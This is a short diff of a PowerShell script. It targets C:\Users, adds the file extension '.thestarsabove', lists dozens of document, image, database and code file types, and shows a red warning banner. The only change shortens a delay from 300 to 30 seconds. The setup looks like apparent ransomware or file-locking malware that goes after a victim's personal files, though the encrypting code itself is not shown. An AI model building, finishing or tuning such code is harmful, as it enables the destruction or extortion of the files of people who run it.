@@ -1,6 +1,6 @@
 $Target = "C:\Users"
 $Extension = ".thestarsabove"
-$Delay = 300
+$Delay = 30
 $FileTypes = @('.txt', '.pdf', '.docx', '.xlsx', '.xls', '.doc', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mkv', '.mp3', '.wav', '.zip', '.rar', '.7z', '.tar', '.gz', '.sql', '.mdb', '.db', '.json', '.xml', '.config', '.py', '.js', '.java', '.cpp', '.exe', '.dll', '.cs', '.html', '.css', '.php')
 
 Write-Host "========================================" -ForegroundColor Red
